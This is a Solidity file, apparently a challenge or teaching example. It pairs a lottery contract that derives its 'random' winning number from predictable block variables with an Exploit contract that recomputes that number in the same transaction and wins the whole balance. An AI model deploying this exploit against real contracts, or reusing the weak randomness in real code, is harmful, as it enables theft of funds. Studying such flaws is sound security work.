pragma solidity 0.8.19;


contract ILottery {
    uint256 public PRICE = 10 ether;
    uint256 public constant ENTRY = 1 ether;

    constructor() payable {
        require(msg.value == PRICE, "price not sent");
    }

    function guess(uint256 val) external payable {
        require(msg.value == ENTRY, "the entry not sent"); 

        uint256 winner = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.basefee,
                    block.chainid,
                    block.coinbase,
                    block.difficulty,
                    block.gaslimit,
                    block.number,
                    block.prevrandao,
                    block.timestamp
                )
            )
        );

        require(val == winner, "incorrect guess");
        payable(msg.sender).transfer(address(this).balance);
    }
}


contract Exploit {
    ILottery lottery;
    constructor(address lotteryAddress) payable {
        lottery = ILottery(lotteryAddress);
    }

    function attack() external {
        uint256 winner = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.basefee,
                    block.chainid,
                    block.coinbase,
                    block.difficulty,
                    block.gaslimit,
                    block.number,
                    block.prevrandao,
                    block.timestamp
                )
            )
        );
        lottery.guess{value: 1 ether}(winner);
    }
    
    receive() external payable {}
}
